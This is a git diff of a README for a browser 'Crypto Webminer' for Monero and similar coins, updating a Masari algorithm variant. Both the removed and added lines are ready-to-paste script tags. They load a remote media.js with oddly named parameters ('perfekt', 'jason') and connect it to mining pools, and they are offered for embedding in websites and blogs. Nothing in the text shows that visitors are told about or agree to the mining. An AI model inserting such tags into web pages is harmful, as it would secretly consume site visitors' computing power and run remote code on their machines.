@@ -35,9 +35,9 @@ Crypto Webminer | Electroneum | Monero | Bytecoin | IntenseCoin | Graft | Sumoko
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn-lite?variant=2?jason=pool.nxstream.io:3333" > </script>
 ```
-#### Examples: CN Fast Coins (Masari) need ?algo=cn/msr?variant=1<br> 
+#### Examples: CN Fast Coins (Masari) need ?algo=cn/msr?variant=2<br> 
 ```sh
-<script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn/msr?variant=1?jason=masari.ingest.cryptoknight.cc:3333" > </script>
+<script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn/msr?variant=2?jason=masari.ingest.cryptoknight.cc:3333" > </script>
 ```
 <br><br> 
 Or use our integration for websites & blogs
